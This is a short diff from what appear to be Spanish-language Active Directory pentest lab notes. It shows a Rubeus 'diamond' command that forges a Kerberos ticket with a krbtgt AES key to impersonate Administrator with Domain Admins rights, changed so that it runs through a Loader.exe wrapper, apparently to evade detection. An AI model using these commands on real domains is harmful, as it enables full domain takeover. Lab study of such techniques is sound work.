@@ -25,7 +25,7 @@ Tags: #AD #Windows #Powershell #Rubeus
 ```powershell 
 ! Usuario: Usuario de dominio válido sin necesidad de conocer su contraseña (requiere AES key de krbtgt)
 
-❯ .\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+❯ .\Loader.exe -path C:\AD\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 
 # Forjar un Diamond Ticket usando delegación en lugar de credenciales — obtiene un TGT del usuario actual y lo modifica para impersonar a Administrator.
 # /krbkey     → AES key de krbtgt
